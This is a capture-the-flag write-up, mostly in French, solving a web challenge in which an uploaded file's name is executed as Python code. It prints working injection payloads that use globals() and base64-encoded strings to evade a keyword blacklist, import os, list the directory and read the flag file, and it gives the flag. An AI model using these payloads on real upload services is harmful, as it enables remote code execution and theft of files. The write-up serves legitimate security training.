# Upload me ☁️
```
70 pts
```

## Description
```
[FR]
Pour la soumission des trésors à protéger, une application web a été mise en place. Mais parait-il qu'un fichier sensible est caché ici.

[EN]
For the submission of treasures to be protected, a web application has been set up. But it seems that a sensitive file is hidden here.

Author: Hum4n

http://ctf.hackerlab.bj:5004
```
> Le nom de ce challenge nous fait penser à la vulnérabilité d'upload de fichier sans restriction. Nous avons donc décidé de téléverser une simple image.
> Lorsque nous téléversons le fichier, un message d'erreur apparaît disant qu'un nom n'est pas défini `NameError: name 'testtest' is not defined`, ce qui nous fait penser au langage Python.

<image src='File/upload1.png'>

> Nous avons donc émis l'hypothèse selon laquelle le nom du fichier était exécuté comme code Python. Pour vérifier cela, nous allons utiliser Burp Suite pour intercepter et modifier à chaque fois le nom du fichier grâce à l'outil *Repeater*.
> Nous allons d'abord essayer un simple 'print' ```print('test').png```, mais nous obtenons une erreur AttributeError: 'str' object has no attribute 'png'. Donc le *.png* est aussi pris en compte.
 
<image src='File/upload6.png'>
  
> Nous avons alors décidé de commenter le .png print ('test')#.png. 🙂 On arrive maintenant à exécuter le code.

> L'objectif maintenant est de trouver un payload afin d'exécuter du code système.

<image src='File/upload2.png'>

> Mais nous avons remarqué que plusieurs mots clés sont blacklistés comme ```import```, ```class```, ```subclasses```.

<image src='File/upload3.png'>
  
> Nous avons finalement remarqué que *globals* n'était pas bloqué. Nous avons à partir de là écrit un payload pour importer le package os ```globals().values()[0].__dict__['__import__']('os')```. Le problème qui se pose à ce niveau est que *import* et *os* sont blacklistés.
Mais comme il s'agit dans ce payload de chaînes de caractères, nous pouvons les encoder en utilisant la base64.
```print(globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')))#.png```, avec ce payload nous arrivons à importer os.

> Nous allons maintenant lister le contenu du répertoire courant ```print( globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).listdir('.'))#.png```.

<image src='File/upload4.png'>

> On remarque l'existence d'un fichier flag dans le répertoire.
> Nous allons maintenant afficher le fichier flag avec ce payload ```print (globals().values()[0].__dict__['open']('flag','r').read())#.jpg```. Comme précédemment nous allons coder open et flag en base64. ```print (globals().values()[0].__dict__['b3Blbg=='.decode('base64')]('ZmxhZw=='.decode('base64'),'r').read())#.jpg```.

<image src='File/upload5.png'>

# Flag
```CTF_w0w_pyth0n_bad_or_g00d``` 🔥
